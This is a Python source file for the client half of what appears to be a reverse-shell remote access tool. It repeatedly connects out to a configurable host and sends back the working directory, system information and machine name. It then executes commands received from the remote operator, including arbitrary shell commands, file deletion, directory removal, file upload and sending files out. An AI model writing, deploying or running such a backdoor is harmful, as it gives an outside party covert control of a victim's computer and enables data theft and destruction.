import os
import socket
from time import sleep
from commands import Commands


class Connect(Commands):
    def __init__(self, host, port):
        super().__init__()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.port = port

    def connect(self):
        while True:
            try:
                self.client.connect((self.host, self.port))
                separator = '=' * 50
                directory = os.getcwd()
                sys_info = super().sys_info()
                pc_name = super().get_pc_name()
                answer = f'{directory}\n{separator}\n{sys_info}\n{separator}\n{pc_name}'
                answer = answer.encode()
                self.client.send(answer)
                break
            except ConnectionRefusedError:
                sleep(10)
                continue
        self.poling()

    def get_file(self):
        max_size = 1024 ** 2
        output = self.client.recv(max_size)
        if output.decode() == 'return':
            return "RETURNED"
        return super().write_file(output)

    def operator(self, command: str) -> str:
        if command.startswith('cd'):
            path = command.split()[1]
            answer = super().change_dir(path)

        elif command == 'sysinfo':
            answer = super().sys_info()

        elif command == 'sending':
            answer = self.get_file()

        elif command.startswith('del'):
            file = command.split()[1]
            answer = super().del_file(file)

        elif command.startswith('rmdir'):
            path = command.split()[1]
            answer = super().remove_dir(path)

        elif command.startswith('get'):
            file = command.split()[1]
            answer = super().send_file(file)
            return answer

        elif command == 'exit':
            raise ConnectionError

        else:
            answer = super().command(command)

        return answer

    def poling(self) -> None:
        while True:
            command = self.client.recv(1024)
            command = command.decode()
            try:
                answer = self.operator(command)
                if isinstance(answer, bytes):
                    self.client.send(answer)
                else:
                    answer = answer.encode()
                    self.client.send(answer)
            except ConnectionError:
                break
        self.client.shutdown(socket.SHUT_RDWR)
        self.client.close()
